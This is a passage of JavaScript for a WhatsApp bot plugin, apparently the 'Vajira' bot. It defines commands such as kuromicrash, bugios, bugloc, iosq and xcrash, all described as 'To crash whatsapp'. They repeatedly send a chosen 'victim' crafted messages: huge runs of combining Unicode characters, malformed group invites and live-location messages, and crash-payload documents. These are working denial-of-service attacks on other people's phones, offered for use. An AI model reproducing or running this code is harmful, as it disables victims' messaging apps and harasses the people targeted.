ꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗ`, contextInfo: { externalAdReply:{title: `vajira`,previewType:"PHOTO",showAdAttribution: true, body: `vajira`, mediaUrl: `https://youtube.com/@gamingewingyt6216?si=4Ds50i6gx8_IrZol`, mediaType: 2, thumbnail: travaft}}
          }},{})
conn.sendMessage(from,{react: { text: "⏳️", key: mek.key}})
for (let i = `30`;i !== 0; i -=1){
cntt()
await sleep("10000")
}
conn.sendMessage(from,{react: { text: "✅️", key: mek.key}})
} catch (e) {
reply('an error occurred while executing the command contact the Vajira developer!')
l(e)
}
}) 





cmd({
    pattern: "kuromicrash",
    react: "🔖",
    desc: "To crash whatsapp",
    category: "bug",
    use: '.kuromicrash',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{   
if (!isMe) return reply('Only can use Premium Users 🔐')        
//if(from.includes('94719199757') || from.includes('94719199757') || from.includes('94719199757')) return reply('Sorry, I cant upload code to my Vajira developer 🥱\nTry to use it on another private!!')
//if(from.includes('120363026309634278@g.us') || from.includes('120363028400218278@g.us')) return reply('Sorry, I cant send locks to my Vajira developers group 🥱\nTry using it in another group!!')	const kuromibug = {"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": 'status@broadcast' },message: {"listResponseMessage": { "title": `😈{Kuromi+-)👹∆¶∆👺fudendo seu zapo=∆}😈😈` }}}

//const kuromicrash = (teks) => {
for (let i = 0; i < 10; i++) {
var extended = generateWAMessageFromContent(from, proto.Message.fromObject({
"extendedTextMessage": {
"text": '😈{Kuromi+-)👹∆¶∆👺fudendo seu zapo=∆}😈😈',
"mediaType": 2,
"contextInfo":{"externalAdReply": {
//"title": `😈{Kuromi+-)👹∆¶∆👺fudendo seu zapo=∆}😈😈`,
"body": `Foi a Kuromi kkkkk`,
"thumbnail": travaft,
"sourceUrl": `😈{Kuromi+-)👹∆¶∆👺fudendo seu zapo=∆}😈😈`
}}
}}), { userJid: from, quoted: kuromibug })
conn.relayMessage(from, extended.message, { messageId: extended.key.id })
}
conn.sendMessage(from,{react: { text: "✅️", key: mek.key}})
} catch (e) {
reply('an error occurred while executing the command contact the Vajira developer!')
l(e)
}
}) 

cmd({
    pattern: "crashstickerpack",
    react: "🔖",
    desc: "To crash whatsapp",
    category: "bug",
    use: '.crashstickerpack',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{   
if (!isMe) return reply('Only can use Premium Users 🔐')        
//if(from.includes('94719199757') || from.includes('94719199757') || from.includes('94719199757')) return reply('Sorry, I cant upload code to my Vajira developer 🥱\nTry to use it on another private!!')
//if(from.includes('120363026309634278@g.us') || from.includes('120363028400218278@g.us')) return reply('Sorry, I cant send locks to my Vajira developers group 🥱\nTry using it in another group!!')	for (let i = 0; i < 20; i++) {
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `🕸️PINK VENOM BUGSぴ 🕸️ꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗ\https://wa.me/stickerpack/whatsappcuppy`,
"matchedText": "https://wa.me/stickerpack/whatsappcuppy",
"description": "ꪶཷ୭͓ꦿ݉ᐧᨗ🔥𝑪𝑹𝑨𝑺𝑯 𝑺𝑻𝑰𝑪𝑲𝑬𝑹𝑷𝑨𝑪𝑲🔥ꪶཷ୭͓ꦿ݉ᐧ",
"title": `ꪶཷ୭͓ꦿ݉ᐧᨗ🔥𝑩𝒚 Pink Venom🔥ꪶཷ୭͓ꦿ `,
"reviewType": "PHOTO", 
"mediaType": 2,
"jpegThumbnail": travaft
}
}), { userJid: m.chat, quoted: crashvajira })
conn.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
//}
conn.sendMessage(from,{react: { text: "✅️", key: mek.key}})
} catch (e) {
reply('an error occurred while executing the command contact the Vajira developer!')
l(e)
 }
}) 



cmd({
    pattern: "trava-convite",
    react: "🔖",
    desc: "To crash whatsapp",
    category: "bug",
    use: '.trava-convite',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{   
if (!isMe) return reply('Only can use Premium Users 🔐')    
//if(from.includes('94719199757') || from.includes('94719199757') || from.includes('94719199757')) return reply('Sorry, I cant upload code to my Vajira developer 🥱\nTry to use it on another private!!')
//if(from.includes('120363026309634278@g.us') || from.includes('120363028400218278@g.us')) return reply('Sorry, I cant send locks to my Vajira developers group 🥱\nTry using it in another group!!')		
conn.sendMessage(from,{react: { text: "⏳️", key: mek.key}})
        var messa = await prepareWAMessageMedia({ image: thumb}, { upload: conn.waUploadToServer })

var liveLocati = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": { 
    groupJid: '1234567890@g.us', // JID do grupo
    inviteCode: 'abcdefg', // Código de convite
    inviteExpiration: Date.now() + 86400000, // Expiração do convite (um dia a partir de agora)
    groupName: `${telapreta3}`, // Nome do grupo
    thumbnail: thumb, // Miniatura JPEG
    caption: '😈 PinkVenok Bug 😈 ن؃؄ٽ؂ن؃؄ٽن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿن؃؄ٽ؂ن؃؄ٽن؃؄ٽ؂ن؃؄ٽن؃؄ٽ؂ن؃؄ٽن؃؄ٽ؂ن؃؄ٽن؃؄ٽ؂ن؃؄ٽن؃؄ٽ؂ن؃؄ٽن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽ݉ᐧᨗ', // Legenda da mensagem
    groupType: 1
  			}}), { userJid: from, quoted: m})
await conn.relayMessage(from, liveLocati.message, { messageId: liveLocati.key.id })
conn.sendMessage(from,{react: { text: "✅️", key: m.key}})
} catch (e) {
reply('*Error !!*')
l(e)
}
}) 


cmd({
    pattern: "bugios2",
    react: "🔖",
    desc: "To crash whatsapp",
    category: "bug",
    use: '.bugios2',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{   
if (!isMe) return reply('Only can use Premium Users 🔐')    
 //if(from.includes('94719199757') || from.includes('94719199757') || from.includes('94719199757')) return reply('Sorry, I cant upload code to my Vajira developer 🥱\nTry to use it on another private!!')
//if(from.includes('120363026309634278@g.us') || from.includes('120363028400218278@g.us')) return reply('Sorry, I cant send locks to my Vajira developers group 🥱\nTry using it in another group!!')	            for (let i = 0; i < 20; i++) {  
var messa = await prepareWAMessageMedia({ image: { url: 'https://wallpapercave.com/wp/wp2630301.jpg'}}, { upload: conn.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
      "groupInviteMessage": {
         "groupJid": "85296556573-1328272333@g.us",
         "inviteCode": "wFHwtOxGQN8OwK2x",
         "inviteExpiration": "99999999999999999",
         "groupName": pvmdbug7,
         "caption": pvmdbug7,
      },
   "expiration": '99999999999999999',
   "ephemeralSettingTimestamp": "1691187379",
   "disappearingMode": {
      "initiator": "CHANGED_IN_CHAT"
   }
}), { userJid: from, quoted: crashvajira })
conn.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
//m.reply(`Sukses Mengirim Bug Ke Target !!!`)
conn.sendMessage(from,{react: { text: "✅️", key: mek.key}})
} catch (e) {
console.log(e);
reply('*Error !!*')
l(e)
}
})
       

cmd({
    pattern: "iosgoogle",
    react: "🔖",
    desc: "To crash whatsapp",
    category: "bug",
    use: '.iosgoogle 1',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{   
if (!isMe) return reply('Only can use Premium Users 🔐')
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
conn.sendMessage(m.chat,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: pvmdbug6,
body: `ن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗ😈👹ꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗ👹😈ꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗن؃؄ٽ؂ن؃؄ٽꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗ`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
} catch (e) {
reply('*Error !!*')
l(e)
}
}) 


cmd({
    pattern: "iosgoogle2",
    react: "🔖",
    desc: "To crash whatsapp",
    category: "bug",
    use: '.iosgoogle2 number',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{   
if (!isMe) return reply('Only can use Premium Users 🔐')    
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = q.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
conn.sendMessage(victim,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: pvmdbug6,
body: `ꪶཷ୭͓ꦿ݉ᐧᨗ🕸️ꪶཷ୭͓ꦿ݉ᐧᨗ🕸️ꪶཷ୭͓ꦿ݉ᐧᨗ🕸️ꪶཷ୭͓ꦿ݉ᐧᨗ🕸️ꪶཷ୭͓ꦿ🕸️ꪶཷ୭͓ꦿ݉ᐧᨗ🕸️ꪶཷ୭͓ꦿ݉ᐧᨗ🕸️ꪶཷ୭͓ꦿ݉ᐧᨗ🕸️݉ᐧᨗ`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
} catch (e) {
reply('*Error !!*')
l(e)
}
}) 


cmd({
    pattern: "iosq",
    react: "🔖",
    desc: "To crash whatsapp",
    category: "bug",
    use: '.iosq 94xxxxxxxxx',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{   
if (!isMe) return reply('Only can use Premium Users 🔐')
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 94xxxxxxxxx`)
victim = q.split("|")[0]+'@s.whatsapp.net'
amount = "20"
for (let i = 0; i < amount; i++) {
conn.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": victim,
"participant": victim,
"quotedMessage": {
"conversation": vajiratext1
},
"disappearingMode": {
"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
},{messageId: null})
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
} catch (e) {
reply('*Error !!*')
l(e)
}
}) 	
    
cmd({
    pattern: "xcrash",
    react: "🔖",
    desc: "To crash whatsapp",
    category: "bug",
    use: '.xcrash 1',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{   
if (!isMe) return reply('Only can use Premium Users 🔐')
 if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 94xxxxxxxxx`)
 victim = q.split("|")[0]+'@s.whatsapp.net'
amount = "20"
for (let i = 0; i < amount; i++) {
async function vajiraCrashy(wmpvmd,chat) {
conn.sendMessage(chat, {
document: {url: './bugs/mr.penis01.js'},
mimetype: `image/null`,
fileName: `${wmpvmd}.${vajiratext1}` ,
caption: `${wmpvmd + vajiratext1}`,
}, {quoted: subscribe_dgxeon })
}      
vajiraCrashy(pushname,victim)
conn.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": victim,
"participant": victim,
"quotedMessage": {
"conversation": vajiratext1
},
"disappearingMode": {
"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
},{messageId: null})    
await sleep(3000)
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
} catch (e) {
reply('*Error !!*')
l(e)
}
}) 		    	

cmd({
    pattern: "xcrash2",
    react: "🔖",
    desc: "To crash whatsapap",
    category: "bug",
    use: '.xcrash2 1',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{   
if (!isMe) return reply('Only can use Premium Users 🔐')
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
async function vajiraCrashy(wmpvmd,chat) {
conn.sendMessage(chat, {
document: {url: './bugs/ios.js'},
mimetype: `image/null`,
fileName: `${wmpvmd}.${vajiratext1}` ,
caption: `${wmpvmd + vajiratext1}`,
}, {quoted: subscribe_dgxeon })
}  
vajiraCrashy(pushname,mek.chat)
await sleep(3000)
}
reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
} catch (e) {
reply('*Error !!*')
l(e)
}
}) 		    	



cmd({
    pattern: "bugios",
    react: "🔖",
    desc: "To crash whatsapp",
    category: "bug",
    use: '.bugios',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{   
if (!isOwner) return await reply('🚩 *You must be a bots owner frist*')
const { ios } = require("../bugs/ios")
const { sleyer } = require("../bugs/mr.penis01")
//if(from.includes('120363026309634278@g.us') || from.includes('120363028400218278@g.us')) return reply('Sorry, I cant send locks to my Vajira developers group 🥱\nTry using it in another group!!')	
for (let i = 0; i < 20; i++) {
var messa = await prepareWAMessageMedia({ image: { url: 'https://wallpapercave.com/wp/wp2630301.jpg'}}, { upload: conn.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
      "groupInviteMessage": {
         "groupJid": "85296556573-1328272333@g.us",
         "inviteCode": "wFHwtkxGQN8OwK6x",
         "inviteExpiration": "99999999999999999",
         "groupName": sleyer,
         "caption": ios,
      },
   "expiration": '99999999999999999',
   "ephemeralSettingTimestamp": "1691187379",
   "disappearingMode": {
      "initiator": "CHANGED_IN_CHAT"
   }
}), { userJid: from })
conn.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
//m.reply(`Sukses Mengirim Bug Ke Target !!!`)
}
conn.sendMessage(from,{react: { text: "✅️", key: mek.key}})
  } catch (e) {
    console.log(e);
reply('*Error !!*')
console.log(e)
}
})

//=============crash system with location bug------------------------------------
cmd({
    pattern: "bugloc",
    react: "🔖",
    desc: "To crash whatsapp",
    category: "bug",
    use: '.bugloc',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{   
if (!isOwner) return await reply('🚩 *You must be a bots owner frist*')
//if(from.includes('120363026309634278@g.us') || from.includes('120363028400218278@g.us')) return reply('Sorry, I cant send locks to my Vajira developers group 🥱\nTry using it in another group!!')	
for (let i = 0; i < 20; i++) {
var messa = await prepareWAMessageMedia({ image: { url: 'https://wallpapercave.com/wp/wp2630301.jpg'}}, { upload: conn.waUploadToServer })
var buglocation = generateWAMessageFromContent(from, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'ꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗ؂😈ن؃؄ٽ؂ن؃؄ٽ😈ꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗꪶཷ୭͓ꦿ݉ᐧᨗ' + 'ꪶཷ୭͓ꦿ݉ᐧᨗ'.repeat(60000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': from
  });

conn.relayMessage(from, buglocation.message, { messageId: buglocation.key.id })
}
//conn.sendMessage(from,{react: { text: "✅️", key: mek.key}})
  } catch (e) {
    console.log(e);
reply('*Error !!*')
console.log(e)
}
})

